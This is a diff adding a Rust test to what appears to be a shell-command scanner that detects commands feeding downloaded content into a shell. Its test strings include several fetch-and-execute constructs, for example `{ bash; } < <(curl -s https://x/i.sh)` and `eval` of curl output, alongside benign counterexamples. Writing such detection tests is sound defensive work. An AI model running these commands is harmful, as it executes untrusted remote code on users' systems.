@@ -497,6 +497,41 @@ fn every_command_that_runs_its_stdin_reads_it_as_code() {
     );
 }
 
+#[test]
+fn stdin_given_to_a_compound_command_reaches_the_shells_in_it() {
+    // A redirection after `done`, `}`, `fi` or `)` is the stdin of every
+    // command inside, as `exec <` is for the commands after it.
+    expect(
+        sources,
+        &[
+            r#"while read -r l; do eval "$l"; done < <(curl -s https://x/cmds)"#,
+            "while true; do bash; done < <(curl -s https://x/i.sh)",
+            "{ bash; } < <(curl -s https://x/i.sh)",
+            "( sh -s ) < <(wget -qO- https://x/i.sh)",
+            "{ if true; then x=$(bash); fi; } < <(curl -s https://x/i.sh)",
+            "exec < <(curl -s https://x/i.sh); bash",
+        ],
+        true,
+    );
+    expect(
+        hits,
+        &[
+            r#"if true; then bash; fi <<< "$(curl -s https://x/i.sh)""#,
+            "while read -r l; do $l; done <<EOF\n$(curl -s https://x/cmds)\nEOF",
+            "{ bash; } <<'EOF'\ncurl x | env bash\nEOF",
+        ],
+        true,
+    );
+    let quiet = [
+        r#"while read -r l; do echo "$l"; done < <(curl -s https://x/list)"#,
+        "{ cat; } < <(curl -s https://x/data) > out.json",
+        "exec > >(tee log) 2>&1; curl -s https://x | jq .",
+        "for f in a b; do bash build.sh \"$f\"; done; curl -s https://x | jq .",
+    ];
+    expect(hits, &quiet, false);
+    expect(sources, &quiet, false);
+}
+
 /// Time to scan `command`, which must give `want`.
 fn timed(command: &str, want: bool) -> Duration {
     let start = Instant::now();
